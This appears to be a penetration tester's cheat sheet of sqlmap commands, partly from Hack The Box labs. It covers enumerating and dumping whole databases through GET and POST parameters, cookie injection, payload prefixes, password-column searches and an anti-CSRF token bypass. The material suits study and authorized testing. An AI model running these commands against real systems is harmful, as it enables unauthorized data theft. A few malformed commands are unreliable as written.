**Simple HTTP GET Based Test**  
  
```
sqlmap -u https://testsite.com/page.php?id=7 --dbs 

```  

Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database.



**Simple HTTP POST Based Test**  

First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.

Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:  
  
```
sqlmap -r req.txt -p blood_group --dbs

```  

```
sqlmap -r <request_file> -p <vulnerable_parameter> --dbs

```

  

Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.

Database Enumeration

           `nare@nare$ sqlmap -r req.txt -p blood_group --dbs`
		   
		   **Using GET based Method**  
  
  **Using GET based Method**
  #sqlmap/database/tables


```
sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables

```
  

```
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables

``` 

**Using POST based Method**

```
sqlmap -r req.txt -p blood_group -D blood --tables

```

```
sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables

```


  
**Using GET based Method**
#sqlmap/database/columns
``` 
sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns 

```
``` 
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns 

```

  
**Using POST based Method**

```
sqlmap -r req.txt -D blood -T blood_db --columns

```

``` 
sqlmap -r req.txt -D <database_name> -T <table_name> --columns

```


**Using GET based Method**
#sqlmap/database/dump_all

``` 
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all 

```  
  
``` 
sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all`  

```  
**Using POST based Method**

``` 
sqlmap -r req.txt -D <database_name> --dump-all 

```  
  
``` 
sqlmap -r req.txt-p  -D <database_name> --dump-all

```


```shell-session
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

---
HTB

## injection mark header 
```
sqlmap -r req.txt --cookie='id=1*' --level=2 --dbs --batch
```


## Prefix/Suffix

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

## Level/Risk

```shell-session
 sqlmap -u www.example.com/?id=1 -v 3 --level=5
```


```shell-session
 sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```


```shell-session
 sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

e.g. `-v 3`), messages containing the used `[PAYLOAD]` will be displayed, as follows:


```shell-session
sqlmap -u "http://www.example.com/?id=1" --schema
```

```
sqlmap -u http://178.62.107.21:31912/case1.php?id=1 - search -C pass

```

## Anti-CSRF Token Bypass

```

POST /case8.php HTTP/1.1
Host: 159.65.89.165:31057
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://159.65.89.165:31057/case8.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: http://159.65.89.165:31057
Connection: close
Cookie: PHPSESSID=fm2kervendvoqlie7rsgvmqhc2
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

id=1&t0ken=9KpxvkjMxT6F8TPg9OY9SS8TlGxbQfhWatqtKpyHQ1Y
```

```shell

sqlmap -u "http://www.example.com/" --data="id=1&t0ken=9KpxvkjMxT6F8TPg9OY9SS8TlGxbQfhWatqtKpyHQ1Y" --csrf-token="csrf-token"

```